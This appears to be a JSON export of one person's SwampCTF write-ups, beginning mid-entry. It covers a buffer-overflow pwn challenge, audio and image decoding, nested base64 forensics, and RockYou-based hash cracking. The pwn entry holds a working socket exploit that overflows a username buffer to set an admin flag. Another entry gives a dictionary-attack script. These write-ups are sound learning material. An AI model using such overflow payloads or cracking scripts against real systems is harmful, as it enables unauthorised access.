1, 34, fptr);\n\n    printf(&quot;Here is your flag! %s\\n&quot;, flag);\n\n    fclose(fptr);\n\n}\n\n  \n\nint main(void) {\n\n  \n\n    bool is_admin = false;\n\n    char username[10] = &quot;XXXXXXXXXX&quot;; // prefill buffer with X&#039;s\n\n    char choice[2];\n\n    printf(&quot;At it&#039;s most basic, a computer exploit is finding a loophole in a programs logic which can cause unintended behavior. In this program, we demonstrate how buffer overflows can corrupt local variables.\\n\\n&quot;);\n\n    printf(&quot;To log into this system, please enter your name: &quot;);\n\n  \n\n    scanf(&quot;%s&quot;, username);\n\n    print_stack(&amp;username, 13);\n\n    printf(&quot;Hello, %s!\\n&quot;, username);\n\n  \n\n    if(is_admin == true) {\n\n        printf(&quot;%s is admin\\n&quot;, username);\n\n        printf(&quot;Because the program accepts more characters then it has space to hold, you are able to corrupt the is_admin boolean. And because in C, any Boolean value that isn&#039;t 0 is considered \\&quot;True\\&quot;, it lets you through!\\n&quot;);\n\n    } else {\n\n        printf(&quot;%s is not admin\\n&quot;, username);\n\n    }\n\n    printf(&quot;Do you want to print the flag? (y/n) &quot;);\n\n    scanf(&quot;%1s&quot;, choice);\n\n    if(choice[0] == &#039;y&#039;) {\n\n        if(is_admin == false) {\n\n            printf(&quot;You do not have the necessary access!\\n&quot;);\n\n            return 0;\n\n        }\n\n        print_flag();\n\n    }\n\n    printf(&quot;Exiting!\\n&quot;);\n\n    return 0;\n\n}\n\n(Didn’t include the ‘is_admin’ file because I found it unnecessary when finding my solution, it is more useful when learning how to actually solve a pwn challenge)\nSolution\nAfter looking through the main.c file, it was quite obvious that you have take advantage of buffer overflow in order to set yourself as the admin.\nIn this case after reading the code, you can clearly see where ```\nbool is_admin = false;\nchar username[10] = &quot;XXXXXXXXXX&quot;;\n\nNote, you can also check the is_admin file with an interactive disassembler to see the following\nv6 = 0;\n  strcpy(v5, &quot;XXXXXXXXXX&quot;);\n  printf(\n    &quot;At it&#039;s most basic, a computer exploit is finding a loophole in a programs logic which can cause unintended behavior&quot;\n    &quot;. In this program, we demonstrate how buffer overflows can corrupt local variables.\\n&quot;\n    &quot;\\n&quot;);\n  printf(&quot;To log into this system, please enter your name: &quot;);\n  __isoc99_scanf(&quot;%s&quot;, v5);\n  print_stack(v5, 13LL);\n  printf(&quot;Hello, %s!\\n&quot;, v5);\n  if ( (v5[10] &amp; 1) == 1 )\n  {\n    printf(&quot;%s is admin\\n&quot;, v5);\n    printf(\n      &quot;Because the program accepts more characters then it has space to hold, you are able to corrupt the is_admin boolea&quot;\n      &quot;n. And because in C, any Boolean value that isn&#039;t 0 is considered \\&quot;True\\&quot;, it lets you through!\\n&quot;);\n  }\n\nAnd in the stack of main you can see:\n-000000000000000F     _BYTE var_F[11];\n-0000000000000004     _DWORD var_4;\n\nWhich corresponds to v5 and v6 (username and is_admin)\nAnd whether or not you read the is_admin file or not, it was clear that you needed to use a payload to fill username and an extra byte to set is_admin\nI did this by creating a simple program that connected to the specific port (40004), and inputted the payload AAAAAAAAAA\\x01 as shown below:\n\nimport socket\n\n  \n\nhost = &quot;chals.swampctf.com&quot;\n\nport = 40004\n\n  \n\n# 10 A&#039;s to fill username + 1 byte (0x01) to set is_admin\n\npayload = b&quot;A&quot; * 10 + b&quot;\\x01&quot;\n\n  \n\nwith socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n\n    s.connect((host, port))\n\n    # Read initial prompt\n\n    print(s.recv(1024).decode())\n\n  \n\n    # Send exploit payload\n\n    s.sendall(payload + b&quot;\\n&quot;)\n\n    # Read response (should confirm we are admin)\n\n    print(s.recv(1024).decode())\n\n  \n\n    # Send &#039;y&#039; to print the flag\n\n    s.sendall(b&quot;y\\n&quot;)\n\n  \n\n    # Read final response (should contain flag)\n\n    print(s.recv(1024).decode())\n\nFlag\nAfter running this program, it gave the output with the correct flag:\nswampCTF{n0t_@11_5t@ck5_gr0w_d0wn}"},"WRITEUPS/SwampCTF/Join-our-Discord":{"slug":"WRITEUPS/SwampCTF/Join-our-Discord","filePath":"WRITEUPS/SwampCTF/Join our Discord.md","title":"Join our Discord","links":[],"tags":[],"content":"Description\nJoin our Discord\nMisc\nWorth 25 Points\n\ndiscord.gg/9H6HbcMk7X\nSolution\nAfter reading the challenge description I decided to follow the link to see where it went. It led me to the SwampCTF discord where I was able to find a message from Cole:\n\nFlag\nWith that message, I was able to get the correct flag:\nswampCTF{w3lc0m3_t0_th3_swamp}"},"WRITEUPS/SwampCTF/Lost-in-Translation":{"slug":"WRITEUPS/SwampCTF/Lost-in-Translation","filePath":"WRITEUPS/SwampCTF/Lost in Translation.md","title":"Lost in Translation","links":["CTF/Misc/Miscellaneous"],"tags":[],"content":"Miscellaneous\nDescription\nLost in Translation\nMisc\nWorth 158 points\n\nWe found this program which we know has a flag somewhere, but nothing we’ve tried has been able to extract it. Can you figure it out?\nTo run the program, you can use NodeJS (recommended version 18.17.1 or higher).\nIt also had a download link to a ‘Translate.zip’ file which contained:\n\nSolution\nAfter reading through each of these files, one of my teammates yoshixi noticed that the challenge.js file had some whitespace code hidden through the file.\nSo, using www.dcode.fr/whitespace-language , I inputted the entire challenge.js file into it in order to decrypt the whitespace code.\nFlag\nThat decryption output the correct flag:\nswampCTF{Whit30ut_W0rk5_W0nd3r5}"},"WRITEUPS/SwampCTF/Messages-From-The-Stars":{"slug":"WRITEUPS/SwampCTF/Messages-From-The-Stars","filePath":"WRITEUPS/SwampCTF/Messages From The Stars.md","title":"Messages From The Stars","links":["WRITEUPS/SwampCTF/Messages-From-The-Stars"],"tags":[],"content":"Messages From The Stars\nDescription\nMessages From The Stars\nMisc\nWorth 193 Points\n\nWe recently detected this signal from deep space, we aren’t quite sure what to make of it but we suspect it originated from intelligent life. Want to take a crack at decoding it?\nThen it had an attached ‘message_from_the_stars.wav’ file\n\nSolution\nAfter listening to the wav file, I quickly realized that the beeps were supposed to represent 1’s and 0’s, so I wrote a program that took the wav file output the binary representation:\nimport numpy as np\n\n  \n\nimport scipy.io.wavfile as wav\n\n  \n\nfrom scipy.fftpack import fft\n\n  \n\nimport matplotlib.pyplot as plt\n\n  \n\n  \n\ndef detect_beeps(audio_data, sample_rate, amp_thresh_ratio=0.1, gap_duration=0.01):\n\n  \n\n &quot;&quot;&quot;\n\n  \n\n Detect beep segments based on amplitude.\n\n  \n\n Returns a list of (start_sample, end_sample) tuples.\n\n  \n\n &quot;&quot;&quot;\n\n  \n\n # Normalize audio data\n\n  \n\n norm_audio = audio_data / np.max(np.abs(audio_data))\n\n  \n\n # Use a threshold relative to maximum amplitude\n\n  \n\n amp_thresh = amp_thresh_ratio\n\n  \n\n  \n\n # Find indices where the signal is above threshold\n\n  \n\n indices = np.where(np.abs(norm_audio) &gt; amp_thresh)[0]\n\n  \n\n if len(indices) == 0:\n\n  \n\n  return []\n\n  \n\n  \n\n beep_segments = []\n\n  \n\n # Use gap_threshold in samples\n\n  \n\n gap_threshold = int(gap_duration * sample_rate)\n\n  \n\n start_idx = indices[0]\n\n  \n\n for i in range(1, len(indices)):\n\n  \n\n  if indices[i] - indices[i-1] &gt; gap_threshold:\n\n  \n\n   # End of a beep detected\n\n  \n\n   end_idx = indices[i-1]\n\n  \n\n   beep_segments.append((start_idx, end_idx))\n\n  \n\n   start_idx = indices[i]\n\n  \n\n beep_segments.append((start_idx, indices[-1]))\n\n  \n\n return beep_segments\n\n  \n\n  \n\ndef dominant_frequency(segment, sample_rate):\n\n  \n\n &quot;&quot;&quot;\n\n  \n\n Compute the dominant frequency of a given audio segment.\n\n  \n\n &quot;&quot;&quot;\n\n  \n\n N = len(segment)\n\n  \n\n fft_vals = np.abs(fft(segment))\n\n  \n\n freqs = np.fft.fftfreq(N, 1/sample_rate)\n\n  \n\n # Consider only the positive frequencies\n\n  \n\n pos_mask = freqs &gt;= 0\n\n  \n\n freqs = freqs[pos_mask]\n\n  \n\n fft_vals = fft_vals[pos_mask]\n\n  \n\n # Return the frequency with maximum magnitude\n\n  \n\n return freqs[np.argmax(fft_vals)]\n\n  \n\n  \n\ndef analyze_wav(file_path):\n\n  \n\n # Load the WAV file\n\n  \n\n sample_rate, audio_data = wav.read(file_path)\n\n  \n\n # Convert to mono if stereo\n\n  \n\n if audio_data.ndim &gt; 1:\n\n  \n\n  audio_data = np.mean(audio_data, axis=1)\n\n  \n\n # Detect beep segments\n\n  \n\n beep_segments = detect_beeps(audio_data, sample_rate, amp_thresh_ratio=0.1, gap_duration=0.01)\n\n  \n\n if not beep_segments:\n\n  \n\n  print(&quot;No beeps detected.&quot;)\n\n  \n\n  return &quot;&quot;\n\n  \n\n # For each beep, compute the dominant frequency\n\n  \n\n beep_frequencies = []\n\n  \n\n for start, end in beep_segments:\n\n  \n\n  segment = audio_data[start:end+1]\n\n  \n\n  freq = dominant_frequency(segment, sample_rate)\n\n  \n\n  beep_frequencies.append(freq)\n\n  \n\n # Determine threshold frequency based on the detected frequencies.\n\n  \n\n # Assuming two distinct clusters, we take the midpoint between min and max.\n\n  \n\n f_min = min(beep_frequencies)\n\n  \n\n f_max = max(beep_frequencies)\n\n  \n\n freq_threshold = (f_min + f_max) / 2\n\n  \n\n # Build the binary string based on the classification\n\n  \n\n binary_string = &quot;&quot;\n\n  \n\n for freq in beep_frequencies:\n\n  \n\n  if freq &lt; freq_threshold:\n\n  \n\n   binary_string += &quot;0&quot;\n\n  \n\n  else:\n\n  \n\n   binary_string += &quot;1&quot;\n\n  \n\n return binary_string\n\n  \n\nif __name__ == &quot;__main__&quot;:\n\n  \n\n file_path = &quot;message_from_the_stars.wav&quot;\n\n  \n\n binary_output = analyze_wav(file_path)\n\n  \n\n print(&quot;Binary output:&quot;)\n\n  \n\n print(binary_output)\n\nAnd by running this program I got:\nn\nSo, I thought the next logical step would be to translate this from binary to text, but it produced absolutely nothing of worth, so I got stuck for a bit until one of my teammates Janky recommended that if the number of 1’s and 0’s were semiprime such that the number was a product of exactly 2 prime numbers, you could use the 1’s and 0’s to form an image usings 0’s as a black pixel, and 1’s and a white pixel. (Note, he got this  Arecibo message idea from www.youtube.com/watch because Vsauce is absolutely goated like that).\nSo I checked how many digits there were, and sure enough there were 6241 characters which is semi prime, and is the product of exactly 2 primes numbers, 79x79. So I edited my program to output a map of the 1’s and 0’s as black and white pixels:\nimport numpy as np\n\nimport scipy.io.wavfile as wav\n\nfrom scipy.fftpack import fft\n\nimport matplotlib.pyplot as plt\n\n  \n\ndef detect_beeps(audio_data, sample_rate, amp_thresh_ratio=0.1, gap_duration=0.01):\n\n    &quot;&quot;&quot;\n\n    Detect beep segments based on amplitude.\n\n    Returns a list of (start_sample, end_sample) tuples.\n\n    &quot;&quot;&quot;\n\n    # Normalize audio data\n\n    norm_audio = audio_data / np.max(np.abs(audio_data))\n\n    # Use a threshold relative to maximum amplitude\n\n    amp_thresh = amp_thresh_ratio\n\n  \n\n    # Find indices where the signal is above threshold\n\n    indices = np.where(np.abs(norm_audio) &gt; amp_thresh)[0]\n\n    if len(indices) == 0:\n\n        return []\n\n  \n\n    beep_segments = []\n\n    # Use gap_threshold in samples\n\n    gap_threshold = int(gap_duration * sample_rate)\n\n    start_idx = indices[0]\n\n    for i in range(1, len(indices)):\n\n        if indices[i] - indices[i-1] &gt; gap_threshold:\n\n            # End of a beep detected\n\n            end_idx = indices[i-1]\n\n            beep_segments.append((start_idx, end_idx))\n\n            start_idx = indices[i]\n\n    beep_segments.append((start_idx, indices[-1]))\n\n    return beep_segments\n\n  \n\ndef dominant_frequency(segment, sample_rate):\n\n    &quot;&quot;&quot;\n\n    Compute the dominant frequency of a given audio segment.\n\n    &quot;&quot;&quot;\n\n    N = len(segment)\n\n    fft_vals = np.abs(fft(segment))\n\n    freqs = np.fft.fftfreq(N, 1/sample_rate)\n\n    # Consider only the positive frequencies\n\n    pos_mask = freqs &gt;= 0\n\n    freqs = freqs[pos_mask]\n\n    fft_vals = fft_vals[pos_mask]\n\n    # Return the frequency with maximum magnitude\n\n    return freqs[np.argmax(fft_vals)]\n\n  \n\ndef analyze_wav(file_path):\n\n    # Load the WAV file\n\n    sample_rate, audio_data = wav.read(file_path)\n\n    # Convert to mono if stereo\n\n    if audio_data.ndim &gt; 1:\n\n        audio_data = np.mean(audio_data, axis=1)\n\n    # Detect beep segments\n\n    beep_segments = detect_beeps(audio_data, sample_rate, amp_thresh_ratio=0.1, gap_duration=0.01)\n\n    if not beep_segments:\n\n        print(&quot;No beeps detected.&quot;)\n\n        return &quot;&quot;\n\n    # For each beep, compute the dominant frequency\n\n    beep_frequencies = []\n\n    for start, end in beep_segments:\n\n        segment = audio_data[start:end+1]\n\n        freq = dominant_frequency(segment, sample_rate)\n\n        beep_frequencies.append(freq)\n\n    # Determine threshold frequency based on the detected frequencies.\n\n    # Assuming two distinct clusters, we take the midpoint between min and max.\n\n    f_min = min(beep_frequencies)\n\n    f_max = max(beep_frequencies)\n\n    freq_threshold = (f_min + f_max) / 2\n\n    # Build the binary string based on the classification\n\n    binary_string = &quot;&quot;\n\n    for freq in beep_frequencies:\n\n        if freq &lt; freq_threshold:\n\n            binary_string += &quot;0&quot;\n\n        else:\n\n            binary_string += &quot;1&quot;\n\n    return binary_string\n\n  \n\ndef generate_image_from_binary(binary_string, p1, p2):\n\n    &quot;&quot;&quot;\n\n    Generates and displays an image from the binary string using dimensions p1 x p2.\n\n    The binary string is trimmed or padded to exactly p1*p2 bits.\n\n    &quot;&quot;&quot;\n\n    total_bits = p1 * p2\n\n    # Trim or pad the binary string as needed\n\n    if len(binary_string) &gt; total_bits:\n\n        binary_string = binary_string[:total_bits]\n\n    else:\n\n        binary_string = binary_string.ljust(total_bits, &quot;0&quot;)\n\n    # Create a numpy array and reshape\n\n    grid = np.array(list(binary_string), dtype=int).reshape((p1, p2))\n\n    # Display the image\n\n    plt.figure(figsize=(8, 8))\n\n    plt.imshow(grid, cmap=&quot;gray&quot;, interpolation=&quot;nearest&quot;)\n\n    plt.title(f&quot;Binary Image ({p1} x {p2})&quot;)\n\n    plt.axis(&quot;off&quot;)\n\n    plt.show()\n\n  \n\nif __name__ == &quot;__main__&quot;:\n\n    file_path = &quot;message_from_the_stars.wav&quot;\n\n    binary_output = analyze_wav(file_path)\n\n    print(&quot;Binary output:&quot;)\n\n    print(binary_output)\n\n    # Create a 79x79 image from the binary output\n\n    generate_image_from_binary(binary_output, 79, 79)\n\nAfter being run, the program gives the following output:\n\nFlag\nSo, after taking the correct flag from the program output, I get:\nswampCTF{gr33tings_from_anoth3r_wav3form}"},"WRITEUPS/SwampCTF/Planetary-Storage":{"slug":"WRITEUPS/SwampCTF/Planetary-Storage","filePath":"WRITEUPS/SwampCTF/Planetary Storage.md","title":"Planetary Storage","links":["CTF/Forensics/Forensics"],"tags":[],"content":"Forensics\nDescription\nPlanetary Storage\nForensics\nWorth 200 Points\n\nMy friend found this strange file while perusing his computer, but we can’t read it. Can you figure out what it is and get the information from it?\nDifficulty: Easy/Medium\nThe flag is in the standard format\nIt also had a download link to a ‘PlanetaryStorage.zip’ file which contained:\n\nSolution\nAfter searching through each file, I found that CURRENT, CURRENT.bak, LOCK, MANIFEST-000012 contained nothing of interest; LOG contained a little bit of data on the .ldb files, but not much of interest still; while the .ldb files contained a lot of information.\nStarting in 000002.ldb, I found a base64 string called the payload:\n&quot;payload&quot;:&quot;eyJrZXkiOiJcIjdiZjFjNTRlLTA5MjAtNGU2Zi1iNTBiLTE0ZDgzODY3NDdmN1wiIiwib3AiOiJQVVQiLCJ2YWx1ZSI6ImV5SmtZWFJoSWpwYklsUm9hWE1pTENKcGN5SXNJbUVpTENKeVpXUWlMQ0pvWlhKeWFXNW5JU0pkTENKcFpDSTZJbHdpTjJKbU1XTTFOR1V0TURreU1DMDBaVFptTFdJMU1HSXRNVFJrT0RNNE5qYzBOMlkzWENJaWZRPT0ifQ==&quot;\n\nwhich when decrypted gave another base64 string:\n{&quot;key&quot;:&quot;\\&quot;7bf1c54e-0920-4e6f-b50b-14d8386747f7\\&quot;&quot;,&quot;op&quot;:&quot;PUT&quot;,&quot;value&quot;:&quot;eyJkYXRhIjpbIlRoaXMiLCJpcyIsImEiLCJyZWQiLCJoZXJyaW5nISJdLCJpZCI6IlwiN2JmMWM1NGUtMDkyMC00ZTZmLWI1MGItMTRkODM4Njc0N2Y3XCIifQ==&quot;}\n\nAnd when you decrypt that you get:\n{&quot;data&quot;:[&quot;This&quot;,&quot;is&quot;,&quot;a&quot;,&quot;red&quot;,&quot;herring!&quot;],&quot;id&quot;:&quot;\\&quot;7bf1c54e-0920-4e6f-b50b-14d8386747f7\\&quot;&quot;}\n\nSo I went on and starting digging into the 000007.ldb file and found another base64 string called the payload:\neyJrZXkiOiJcIjNhNDdiYmZiLTgyMmMtNDU1Mi04N2VjLTUyNTA4ZDk0OGJkOFwiIiwib3AiOiJQVVQiLCJ2YWx1ZSI6ImV5SmtZWFJoSWpwYklsUm9hWE1pTENKcGN5SXNJbUVpTENKeVpXUWlMQ0pvWlhKeWFXNW5JU0pkTENKcFpDSTZJbHdpTTJFME4ySmlabUl0T0RJeVl5MDBOVFV5TFRnM1pXTXROVEkxTURoa09UUTRZbVE0WENJaWZRPT0ifQ==\n\nwhich gave another base64 string, which when decrypted gave:\n{&quot;data&quot;:[&quot;This&quot;,&quot;is&quot;,&quot;a&quot;,&quot;red&quot;,&quot;herring!&quot;],&quot;id&quot;:&quot;\\&quot;3a47bbfb-822c-4552-87ec-52508d948bd8\\&quot;&quot;}\n\nSo I went on and started digging into the 000010.lbd file hoping that there wasn’t just another red herring. Then I yet another base64 string called the payload:\neyJrZXkiOiJcIjMzNTc5M2Q1LTRhYzEtNDgyMy05MmM3LWZkM2I1YTZhMmEwN1wiIiwib3AiOiJQVVQiLCJ2YWx1ZSI6ImV5SmtZWFJoSWpwYkluTjNZVzF3UTFSR2V6RndaalV0WWpRMU0yUXRaRFEzTkdJME5UTjlJbDBzSW1sa0lqb2lYQ0l6TXpVM09UTmtOUzAwWVdNeExUUTRNak10T1RKak55MW1aRE5pTldFMllUSmhNRGRjSWlKOSJ9\n\nwhich gave another base64 string when decrypted:\n{&quot;key&quot;:&quot;\\&quot;335793d5-4ac1-4823-92c7-fd3b5a6a2a07\\&quot;&quot;,&quot;op&quot;:&quot;PUT&quot;,&quot;value&quot;:&quot;eyJkYXRhIjpbInN3YW1wQ1RGezFwZjUtYjQ1M2QtZDQ3NGI0NTN9Il0sImlkIjoiXCIzMzU3OTNkNS00YWMxLTQ4MjMtOTJjNy1mZDNiNWE2YTJhMDdcIiJ9&quot;}\n\nAnd when I decrypted that I got:\n{&quot;data&quot;:[&quot;swampCTF{1pf5-b453d-d474b453}&quot;],&quot;id&quot;:&quot;\\&quot;335793d5-4ac1-4823-92c7-fd3b5a6a2a07\\&quot;&quot;}\n\nwhich finally wasn’t a red herring\nFlag\nSo using the only non-red herring, I got the correct flag:"},"WRITEUPS/SwampCTF/Pretty-Picture-Double-Exposure":{"slug":"WRITEUPS/SwampCTF/Pretty-Picture-Double-Exposure","filePath":"WRITEUPS/SwampCTF/Pretty Picture Double Exposure.md","title":"Pretty Picture Double Exposure","links":["CTF/Misc/Miscellaneous"],"tags":[],"content":"Miscellaneous\nDescription\nPretty Picture: Double Exposure\nMisc\nWorth 25 points\n\nHidden in the bits below, an image wait’s to be shown.\nAnd it has a link to download this photo:\n\nSolution\nBased on the challenge description, I knew there had to be some sort of hidden data in the photo to do with Exposure, so I plugged the photo into www.aperisolve.com/  and was able to get a superimposed version of the photo:\n\nFlag\nAfter reading the superimposed version, I was able to get the correct flag:\nswampCTF{m3ss4g3s_0r_c0de_c4n_b3_h1dd3n_1n_1m4g3s}"},"WRITEUPS/SwampCTF/Rock-my-Password":{"slug":"WRITEUPS/SwampCTF/Rock-my-Password","filePath":"WRITEUPS/SwampCTF/Rock my Password.md","title":"Rock my Password","links":["CTF/Cryptography/Cryptography","CTF/Cryptography/Ciphers/Hashing"],"tags":[],"content":"Cryptography Hashing\nDescription\nRock my Password\nCryptography\nWorth 150 Points\n\nI’ve come up with an extremely secure(tm) way to store my password, noone will be able to reverse it! I’ve hashed it with md5 100 times, then sha256 100 times, then sha512 100 times! There’s no way you’re going to be able to undo it &gt;:3 I’ll even tell you it was in the RockYou database, and the password is 10 characters long, that’s how confident I am!\nThe flag is in the format: swampCTF{RockYouPassword}\nAs a reminder, please don’t flood our infrastructure with guesses.\nHashed Password (Flag): f600d59a5cdd245a45297079299f2fcd811a8c5461d979f09b73d21b11fbb4f899389e588745c6a9af13749eebbdc2e72336cc57ccf90953e6f9096996a58dcc\nNote: The entire flag (swampCTF{rockyoupassword}) was hashed to get the provided hash, not just rockyoupassword\nSolution\nAfter first looking at this challenge, I tried to come up with some way to brute force the hashed password, but quickly realized that it would take a near infinite amount of time.\nSo, one of my teammates Janky came up with the idea to instead, hash every 10 character password in the RockYou database through md5 100 times, sha256 100 times, then sha512 100 times and compare it against the already hashed password. In his words ‘cause hashing forward is really fast’.\nSo I implemented it just like that. I created a program that went through every 10 character password in the RockYou data base, hash it 300 times, and compare it to the target hash as shown below:\nimport hashlib\n\n  \n\n# Function to hash a given string 100 times with MD5, then SHA-256, then SHA-512\n\ndef custom_hash(password):\n\n    hashed = password.encode()\n\n  \n\n    # MD5 x 100\n\n    for _ in range(100):\n\n        hashed = hashlib.md5(hashed).digest()\n\n  \n\n    # SHA-256 x 100\n\n    for _ in range(100):\n\n        hashed = hashlib.sha256(hashed).digest()\n\n  \n\n    # SHA-512 x 100\n\n    for _ in range(100):\n\n        hashed = hashlib.sha512(hashed).digest()\n\n  \n\n    return hashed.hex()\n\n  \n\n# Given hash to match\n\ntarget_hash = &quot;f600d59a5cdd245a45297079299f2fcd811a8c5461d979f09b73d21b11fbb4f899389e588745c6a9af13749eebbdc2e72336cc57ccf90953e6f9096996a58dcc&quot;\n\n  \n\n# Path to RockYou wordlist (update if needed)\n\nrockyou_path = &quot;C:/Documents/SWAMPCTF/rockyou (1).txt&quot;\n\n  \n\n# Read the RockYou file and process only 10-character passwords\n\nwith open(rockyou_path, &quot;r&quot;, encoding=&quot;latin-1&quot;) as f:\n\n    for password in f:\n\n        password = password.strip()\n\n        if len(password) == 10:  # Only check 10-character passwords\n\n            formatted_password = f&quot;swampCTF{{{password}}}&quot;  # Wrap in flag format\n\n            if custom_hash(formatted_password) == target_hash:\n\n                print(f&quot;FOUND FLAG: swampCTF{{{password}}}&quot;)\n\n                break\n\nFlag\nAfter running the above program, it output the correct flag:\nswampCTF{secretcode}"},"index":{"slug":"index","filePath":"index.md","title":"Welcome to Prof-Starsky's CTF Write-up Digital Garden","links":["WRITEUPS"],"tags":[],"content":"This is my collection of my CTF writeups\n\n\nWriteups - Detailed writeups for various projects and challenges.\n\n"}}